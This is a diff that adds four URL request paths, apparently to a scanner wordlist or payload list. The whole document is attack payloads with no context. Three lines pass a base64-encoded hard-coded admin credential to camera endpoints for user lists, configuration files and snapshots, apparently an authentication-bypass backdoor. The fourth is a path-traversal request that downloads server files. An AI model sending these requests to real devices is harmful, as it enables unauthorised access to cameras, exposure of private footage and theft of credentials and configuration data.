@@ -1,0 +1,4 @@
+/Security/users?auth=YWRtaW46MTEK
+/System/configurationFile?auth=YWRtaW46MTEK
+/onvif-http/snapshot?auth=YWRtaW46MTEK
+/serverLog/downFile.php?fileName=../web/html/serverLog/downFile.php
